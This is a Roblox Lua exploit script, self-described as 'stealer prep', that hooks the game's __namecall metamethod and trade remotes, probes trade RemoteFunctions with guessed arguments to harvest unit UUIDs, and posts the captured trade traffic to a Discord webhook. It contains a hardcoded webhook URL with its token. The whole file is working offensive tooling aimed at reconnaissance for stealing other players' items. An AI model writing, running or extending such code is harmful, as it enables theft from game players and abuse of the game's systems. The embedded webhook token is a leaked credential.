-- =============================================
-- [igc] AA TRADE RECON — STEALER PREP
-- hooks only trade remotes
-- dumps everything that fires during trade
-- sends to Discord automatically
-- =============================================

local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"

local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HS      = game:GetService("HttpService")
local lp      = Players.LocalPlayer
local gui     = lp:WaitForChild("PlayerGui")

local httpFn = (
    syn and syn.request
    or (KRNL_LOADED and http_request)
    or (fluxus and fluxus.request)
    or (Delta and Delta.request)
    or request
    or (http and http.request)
    or function() warn("[igc] no http") end
)

local function getExec()
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if fluxus then return "Fluxus" end
    if Delta then return "Delta" end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end
local EXEC = getExec()

-- =============================================
-- EXACT TRADE REMOTES FROM YOUR LOGS
-- =============================================
local TRADE_RF = {
    "get_evolve_ready_units",
    "offer_unit",
    "remove_offer_unit",
    "ready_trade",
    "accept_trade_request",
    "start_trade_request",
    "define_trade_request",
}

local TRADE_RE = {
    "trade_readied",
    "trade_request_received",
    "trade_request_zoomed",
    "accept_trade_request",
    "inventory_changed",
}

local ARG_SETS = {
    {label="()",     args={}},
    {label="(plr)",  args={lp}},
    {label="(uid)",  args={lp.UserId}},
    {label="(true)", args={true}},
    {label="(1)",    args={1}},
}

-- =============================================
-- CAPTURE
-- =============================================
local NC_LOG  = {}
local RE_LOG  = {}
local RF_HITS = {}

-- =============================================
-- UTILS
-- =============================================
local function fmt(v, d)
    d = d or 0
    if d > 5 then return "..." end
    if type(v) == "string"  then return '"'..v:sub(1,200)..'"' end
    if type(v) == "number" or type(v) == "boolean" then return tostring(v) end
    if type(v) == "table" then
        local out, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 40 then table.insert(out,"..."); break end
            table.insert(out, tostring(k).."="..fmt(val, d+1))
        end
        return "{"..table.concat(out,", ").."}"
    end
    if type(v) == "userdata" then
        local ok, nm = pcall(function() return v.Name end)
        return ok and "[Inst:"..nm.."]" or "[ud]"
    end
    return tostring(v)
end

local function ts() return os.date("%H:%M:%S") end

-- =============================================
-- UI
-- =============================================
if gui:FindFirstChild("TradeRecon") then gui.TradeRecon:Destroy() end

local SG = Instance.new("ScreenGui")
SG.Name = "TradeRecon"; SG.ResetOnSpawn = false; SG.Parent = gui

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0,305,0,400)
Main.Position = UDim2.new(0.5,-152,0.5,-200)
Main.BackgroundColor3 = Color3.fromRGB(8,8,18)
Main.BorderSizePixel = 0; Main.Active = true; Main.Draggable = true; Main.Parent = SG
Instance.new("UICorner",Main).CornerRadius = UDim.new(0,8)
local ms = Instance.new("UIStroke",Main)
ms.Color = Color3.fromRGB(40,40,190); ms.Thickness = 1

-- title
local TB = Instance.new("Frame")
TB.Size = UDim2.new(1,0,0,30); TB.BackgroundColor3 = Color3.fromRGB(12,12,34)
TB.BorderSizePixel = 0; TB.Parent = Main
Instance.new("UICorner",TB).CornerRadius = UDim.new(0,8)

local TL = Instance.new("TextLabel")
TL.Size = UDim2.new(1,-30,1,0); TL.Position = UDim2.new(0,10,0,0)
TL.BackgroundTransparency = 1
TL.Text = "[igc] AA Trade Recon — "..EXEC
TL.TextColor3 = Color3.fromRGB(70,70,220); TL.TextSize = 10
TL.Font = Enum.Font.Code; TL.TextXAlignment = Enum.TextXAlignment.Left; TL.Parent = TB

local XB = Instance.new("TextButton")
XB.Size = UDim2.new(0,20,0,20); XB.Position = UDim2.new(1,-24,0.5,-10)
XB.BackgroundColor3 = Color3.fromRGB(130,20,20); XB.Text = "✕"
XB.TextColor3 = Color3.fromRGB(255,255,255); XB.TextSize = 10
XB.Font = Enum.Font.GothamBold; XB.BorderSizePixel = 0; XB.Parent = TB
Instance.new("UICorner",XB).CornerRadius = UDim.new(0,4)
XB.MouseButton1Click:Connect(function() SG:Destroy() end)

-- webhook
local WHB = Instance.new("TextBox")
WHB.Size = UDim2.new(1,-20,0,24); WHB.Position = UDim2.new(0,10,0,38)
WHB.BackgroundColor3 = Color3.fromRGB(11,11,26); WHB.Text = ""
WHB.PlaceholderText = "https://discord.com/api/webhooks/..."
WHB.TextColor3 = Color3.fromRGB(150,150,230)
WHB.PlaceholderColor3 = Color3.fromRGB(55,55,95)
WHB.TextSize = 10; WHB.Font = Enum.Font.Code
WHB.ClearTextOnFocus = false; WHB.BorderSizePixel = 0; WHB.Parent = Main
Instance.new("UICorner",WHB).CornerRadius = UDim.new(0,4)
Instance.new("UIStroke",WHB).Color = Color3.fromRGB(35,35,130)

-- status
local SL = Instance.new("TextLabel")
SL.Size = UDim2.new(1,-20,0,20); SL.Position = UDim2.new(0,10,0,70)
SL.BackgroundColor3 = Color3.fromRGB(10,10,24); SL.BorderSizePixel = 0
SL.Text = " paste webhook → ARM → trade normally → SEND"
SL.TextColor3 = Color3.fromRGB(100,100,160); SL.TextSize = 10
SL.Font = Enum.Font.Code; SL.Parent = Main
Instance.new("UICorner",SL).CornerRadius = UDim.new(0,4)
local function setStat(m,c) SL.Text=" "..m; SL.TextColor3=c or Color3.fromRGB(55,205,90) end

-- scroll output
local scrollBg = Instance.new("Frame")
scrollBg.Size = UDim2.new(1,-20,0,215); scrollBg.Position = UDim2.new(0,10,0,98)
scrollBg.BackgroundColor3 = Color3.fromRGB(6,6,16); scrollBg.BorderSizePixel = 0
scrollBg.Parent = Main
Instance.new("UICorner",scrollBg).CornerRadius = UDim.new(0,6)
Instance.new("UIStroke",scrollBg).Color = Color3.fromRGB(30,30,110)

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1,-8,1,-8); scroll.Position = UDim2.new(0,4,0,4)
scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 4
scroll.ScrollBarImageColor3 = Color3.fromRGB(50,50,180)
scroll.CanvasSize = UDim2.new(0,0,0,0); scroll.Parent = scrollBg

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0,2); layout.Parent = scroll

local lc = 0
local function addLine(txt, col)
    lc = lc + 1
    local lb = Instance.new("TextLabel")
    lb.Size = UDim2.new(1,-8,0,0); lb.AutomaticSize = Enum.AutomaticSize.Y
    lb.BackgroundTransparency = 1; lb.Text = txt
    lb.TextColor3 = col or Color3.fromRGB(180,180,220)
    lb.TextSize = 10; lb.Font = Enum.Font.Code
    lb.TextXAlignment = Enum.TextXAlignment.Left
    lb.TextWrapped = true; lb.LayoutOrder = lc; lb.Parent = scroll
    task.defer(function()
        scroll.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+8)
        scroll.CanvasPosition = Vector2.new(0,math.huge)
    end)
end
local function clearLines()
    for _,c in ipairs(scroll:GetChildren()) do
        if c:IsA("TextLabel") then c:Destroy() end
    end
    lc = 0; scroll.CanvasSize = UDim2.new(0,0,0,0)
end

-- counters
local function mkC(lbl,x,w)
    local F=Instance.new("Frame")
    F.Size=UDim2.new(0,w,0,30); F.Position=UDim2.new(0,x,0,320)
    F.BackgroundColor3=Color3.fromRGB(10,10,22); F.BorderSizePixel=0; F.Parent=Main
    Instance.new("UICorner",F).CornerRadius=UDim.new(0,4)
    local NL=Instance.new("TextLabel")
    NL.Size=UDim2.new(1,0,0.6,0); NL.BackgroundTransparency=1
    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,205,120)
    NL.TextSize=13; NL.Font=Enum.Font.GothamBold; NL.Parent=F
    local LL=Instance.new("TextLabel")
    LL.Size=UDim2.new(1,0,0.4,0); LL.Position=UDim2.new(0,0,0.6,0)
    LL.BackgroundTransparency=1; LL.Text=lbl
    LL.TextColor3=Color3.fromRGB(65,65,120); LL.TextSize=9
    LL.Font=Enum.Font.Code; LL.Parent=F
    return NL
end

local c1 = mkC("nc calls",  10, 70)
local c2 = mkC("re fires",  85, 70)
local c3 = mkC("rf hits",  160, 70)
local c4 = mkC("uuids",    235, 60)

-- uuid counter
local uuidCount = 0

task.spawn(function()
    while SG.Parent do
        c1.Text = tostring(#NC_LOG)
        c2.Text = tostring(#RE_LOG)
        c3.Text = tostring(#RF_HITS)
        c4.Text = tostring(uuidCount)
        task.wait(1)
    end
end)

-- =============================================
-- NAMECALL HOOK — trade remotes only
-- passes through FIRST, never blocks
-- =============================================
local oldNC
local armed = false

local function armHooks()
    if not hookmetamethod then
        warn("[igc] hookmetamethod unavailable on "..EXEC)
        return false
    end

    oldNC = hookmetamethod(game, "__namecall", function(self, ...)
        if checkcaller and checkcaller() then return oldNC(self,...) end

        local method = getnamecallmethod()
        local tracked = {
            InvokeServer=true, FireServer=true,
            InvokeClient=true, FireClient=true,
        }

        if tracked[method] then
            local fp = "?"; pcall(function() fp = self:GetFullName() end)

            -- ALWAYS pass through first — never block trade UI
            local rets = table.pack(oldNC(self,...))

            local n = fp:lower()
            if n:find("trade") or n:find("offer") or n:find("unit")
            or n:find("swap") or n:find("accept") or n:find("confirm")
            or n:find("ready") or n:find("define") or n:find("start") then

                local entry = {
                    t=ts(), path=fp, method=method,
                    args={}, rets={},
                }
                for i,a in ipairs({...}) do entry.args[i]=fmt(a) end
                for i=1,rets.n do entry.rets[i]=fmt(rets[i]) end

                table.insert(NC_LOG, entry)

                -- count UUIDs in args
                for _,a in ipairs(entry.args) do
                    if type(a)=="string" and (
                        a:match('%x+%-%x+%-%x+%-%x+%-%x+') or
                        a:match('{%x+%-%x+%-%x+%-%x+%-%x+}')
                    ) then
                        uuidCount = uuidCount + 1
                    end
                end

                addLine("⚡ "..ts().." "..fp:match("[^%.]+$").." → "..method,
                    Color3.fromRGB(80,255,160))
                if #entry.args > 0 then
                    addLine("  args: "..table.concat(entry.args,", "),
                        Color3.fromRGB(255,220,50))
                end
                if #entry.rets > 0 then
                    addLine("  ret:  "..table.concat(entry.rets," | "),
                        Color3.fromRGB(100,220,255))
                end
            end

            return table.unpack(rets,1,rets.n)
        end

        return oldNC(self,...)
    end)

    return true
end

-- =============================================
-- RE LISTENER — trade events
-- =============================================
local function listenTradeREs()
    local bound = 0
    for _,v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            local isTrade = false
            for _,t in ipairs(TRADE_RE) do
                if n:find(t) then isTrade=true; break end
            end
            if isTrade then
                local fp = v:GetFullName()
                bound = bound + 1
                v.OnClientEvent:Connect(function(...)
                    local args = {...}
                    local entry = {t=ts(), path=fp, data={}}
                    for i,a in ipairs(args) do entry.data[i]=fmt(a) end
                    table.insert(RE_LOG, entry)
                    addLine("⚡ RE: "..fp:match("[^%.]+$"),Color3.fromRGB(255,180,50))
                    if #entry.data > 0 then
                        addLine("  data: "..table.concat(entry.data," | "),
                            Color3.fromRGB(255,220,100))
                    end
                end)
            end
        end
    end
    return bound
end

-- =============================================
-- INVOKE TRADE RFs
-- tries get_evolve_ready_units with combos
-- this is what gives UUID list while in trade
-- =============================================
local function invokeTradeRFs()
    for _,name in ipairs(TRADE_RF) do
        local rf = RS:FindFirstChild(name, true)
        if rf and rf:IsA("RemoteFunction") then
            for _,combo in ipairs(ARG_SETS) do
                local ok,res = pcall(function()
                    return rf:InvokeServer(table.unpack(combo.args))
                end)
                if ok and res ~= nil then
                    table.insert(RF_HITS, {
                        path = rf:GetFullName(),
                        args = combo.label,
                        data = fmt(res),
                    })
                    addLine("⚡ RF HIT: "..name.." "..combo.label,
                        Color3.fromRGB(80,255,160))
                    addLine("  → "..fmt(res):sub(1,300),
                        Color3.fromRGB(255,220,50))

                    -- count UUIDs in result
                    if type(res)=="table" then
                        for _,v in pairs(res) do
                            if type(v)=="string" and (
                                v:match('%x+%-%x+%-%x+%-%x+%-%x+') or
                                v:match('{%x+%-%x+%-%x+%-%x+%-%x+}')
                            ) then
                                uuidCount = uuidCount + 1
                            end
                        end
                    end
                    break
                end
                task.wait(0.08)
            end
        end
    end
end

-- =============================================
-- WEBHOOK SENDER
-- =============================================
local function sendWH(title, lines)
    local wh = WHB.Text
    if not wh:find("discord.com/api/webhooks") then return end
    local body = table.concat(lines,"\n")
    local chunks = {}
    for i=1,#body,1900 do table.insert(chunks,body:sub(i,i+1899)) end
    for idx,chunk in ipairs(chunks) do
        local t2 = #chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
        pcall(function()
            httpFn({
                Url=wh, Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=HS:JSONEncode({
                    username = "[igc] AA Trade Recon",
                    embeds={{
                        title=t2, description=chunk, color=0x2244FF,
                        footer={text=EXEC.." · "..lp.Name.." · "..lp.UserId}
                    }}
                })
            })
        end)
        if idx<#chunks then task.wait(1.2) end
    end
end

local function sendAllReports()
    -- R1: NC log — every trade remote call + args + returns
    do
        local lines = {
            "**[igc] Trade Recon**",
            "**"..lp.Name.."** `"..lp.UserId.."`",
            "",
            "**== Namecall Trade Log: "..#NC_LOG.." ==**",
            "every trade remote called + args + returns",
            "",
        }
        for i,h in ipairs(NC_LOG) do
            if i>60 then table.insert(lines,"...+"..(#NC_LOG-60).." more"); break end
            table.insert(lines,"⚡ **"..h.t.."** `"..h.path.."`")
            table.insert(lines,"  method: **"..h.method.."**")
            if #h.args>0 then
                table.insert(lines,"  args: "..table.concat(h.args,", "))
            end
            if #h.rets>0 then
                table.insert(lines,"  **→ "..table.concat(h.rets," | ").."**")
            end
            table.insert(lines,"")
        end
        if #NC_LOG==0 then
            table.insert(lines,"_no calls yet — do a trade first_")
        end
        sendWH("Trade Recon — NC Log", lines)
    end

    task.wait(1.5)

    -- R2: RE events — server→client trade fires
    do
        local lines = {
            "**== Trade RE Events: "..#RE_LOG.." ==**",
            "server→client fires during trade",
            "",
        }
        for i,e in ipairs(RE_LOG) do
            if i>40 then break end
            table.insert(lines,"⚡ **"..e.t.."** `"..e.path.."`")
            if #e.data>0 then
                table.insert(lines,"  **data: "..table.concat(e.data," | ").."**")
            end
            table.insert(lines,"")
        end
        if #RE_LOG==0 then
            table.insert(lines,"_no events — start a trade while armed_")
        end
        sendWH("Trade Recon — RE Events", lines)
    end

    task.wait(1.5)

    -- R3: RF direct invoke hits
    do
        local lines = {
            "**== RF Invoke Hits: "..#RF_HITS.." ==**",
            "remotes that returned data on direct invoke",
            "",
        }
        for _,r in ipairs(RF_HITS) do
            table.insert(lines,"⚡ `"..r.path.."` args:"..r.args)
            table.insert(lines,"  **→ "..r.data:sub(1,500).."**")
            table.insert(lines,"")
        end
        if #RF_HITS==0 then
            table.insert(lines,"_no hits — invoke again while in active trade_")
        end
        sendWH("Trade Recon — RF Hits", lines)
    end
end

-- =============================================
-- BUTTONS
-- =============================================
local ArmBtn = Instance.new("TextButton")
ArmBtn.Size = UDim2.new(0,130,0,28); ArmBtn.Position = UDim2.new(0,10,0,358)
ArmBtn.BackgroundColor3 = Color3.fromRGB(25,25,150); ArmBtn.Text = "[ ARM ]"
ArmBtn.TextColor3 = Color3.fromRGB(170,170,255); ArmBtn.TextSize = 12
ArmBtn.Font = Enum.Font.GothamBold; ArmBtn.BorderSizePixel = 0; ArmBtn.Parent = Main
Instance.new("UICorner",ArmBtn).CornerRadius = UDim.new(0,6)

local InvBtn = Instance.new("TextButton")
InvBtn.Size = UDim2.new(0,145,0,28); InvBtn.Position = UDim2.new(0,150,0,358)
InvBtn.BackgroundColor3 = Color3.fromRGB(80,50,10); InvBtn.Text = "[ INVOKE RFs ]"
InvBtn.TextColor3 = Color3.fromRGB(255,180,80); InvBtn.TextSize = 12
InvBtn.Font = Enum.Font.GothamBold; InvBtn.BorderSizePixel = 0; InvBtn.Parent = Main
Instance.new("UICorner",InvBtn).CornerRadius = UDim.new(0,6)

local SendBtn = Instance.new("TextButton")
SendBtn.Size = UDim2.new(1,-20,0,28); SendBtn.Position = UDim2.new(0,10,0,392)
SendBtn.BackgroundColor3 = Color3.fromRGB(18,95,38); SendBtn.Text = "[ SEND TO DISCORD ]"
SendBtn.TextColor3 = Color3.fromRGB(150,255,150); SendBtn.TextSize = 12
SendBtn.Font = Enum.Font.GothamBold; SendBtn.BorderSizePixel = 0; SendBtn.Parent = Main
Instance.new("UICorner",SendBtn).CornerRadius = UDim.new(0,6)

ArmBtn.MouseButton1Click:Connect(function()
    if armed then setStat("already armed ✓"); return end
    local wh = WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("paste webhook first", Color3.fromRGB(230,60,60)); return
    end
    clearLines()
    task.spawn(function()
        setStat("arming hooks...", Color3.fromRGB(230,170,30))
        ArmBtn.Text = "[ ARMING... ]"

        local ncOk = armHooks()
        local bound = listenTradeREs()

        armed = true
        ArmBtn.Text = "[ ARMED ✓ ]"
        ArmBtn.BackgroundColor3 = Color3.fromRGB(10,55,10)

        if ncOk then
            setStat("armed ✓ — start a trade now",Color3.fromRGB(55,205,90))
            addLine("namecall hook: active",Color3.fromRGB(55,205,90))
        else
            setStat("nc hook unavailable — RE only",Color3.fromRGB(230,170,30))
            addLine("namecall hook: not available on "..EXEC,Color3.fromRGB(230,170,30))
        end
        addLine("RE listeners bound: "..bound,Color3.fromRGB(55,205,90))
        addLine("",nil)
        addLine("start a trade — all calls log here live",Color3.fromRGB(150,150,200))
    end)
end)

InvBtn.MouseButton1Click:Connect(function()
    if not armed then setStat("arm first",Color3.fromRGB(230,60,60)); return end
    setStat("invoking trade RFs...",Color3.fromRGB(230,170,30))
    InvBtn.Text = "[ INVOKING... ]"
    task.spawn(function()
        invokeTradeRFs()
        setStat("invoke done — "..#RF_HITS.." hits",Color3.fromRGB(55,205,90))
        InvBtn.Text = "[ INVOKE RFs ]"
    end)
end)

SendBtn.MouseButton1Click:Connect(function()
    local wh = WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("paste webhook first",Color3.fromRGB(230,60,60)); return
    end
    if #NC_LOG==0 and #RE_LOG==0 and #RF_HITS==0 then
        setStat("nothing captured yet — do a trade first",Color3.fromRGB(230,170,30)); return
    end
    setStat("sending...",Color3.fromRGB(230,170,30))
    SendBtn.Text = "[ SENDING... ]"
    SendBtn.BackgroundColor3 = Color3.fromRGB(10,55,10)
    task.spawn(function()
        sendAllReports()
        setStat("sent ✓ — check Discord",Color3.fromRGB(80,255,160))
        SendBtn.Text = "[ SEND TO DISCORD ]"
        SendBtn.BackgroundColor3 = Color3.fromRGB(18,95,38)
    end)
end)

print("[igc] AA Trade Recon loaded on "..EXEC)
